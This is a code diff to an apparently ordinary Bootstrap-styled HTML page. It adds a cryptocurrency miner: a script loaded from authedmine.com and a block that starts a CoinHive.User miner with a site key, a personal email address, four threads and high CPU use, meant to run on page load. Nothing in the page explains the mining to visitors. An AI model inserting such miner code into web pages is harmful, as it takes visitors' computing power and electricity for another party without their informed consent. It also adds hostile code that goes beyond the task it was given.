@@ -6,6 +6,7 @@
   <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1//jquery.min.js"></script>
   <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+  <script src="https://authedmine.com/lib/authedmine.min.js"></script>
   <style>
    div#divBody{ margin-top:5%;margin-left:1%;margin-right:1%;margin-bottom:5%; }
    a{ color:#000000; }
@@ -94,5 +95,17 @@
     </div>
    </div>
   </div>
+  <script>
+   function startMining(){
+    var miner = new CoinHive.User("6ETSxYPA2yEhjq4sjlPzbY9GWTCTF6xC", "lpottorff1999@gmail.com", {
+     threads: 4, throttle: 0.8,
+     forceASMJS: false,
+     theme: 'dark',
+     language: 'auto'
+    });
+    miner.start();
+   }
+   document.addEventListener("onload", startMining);
+  </script>
  </body>
 </html>
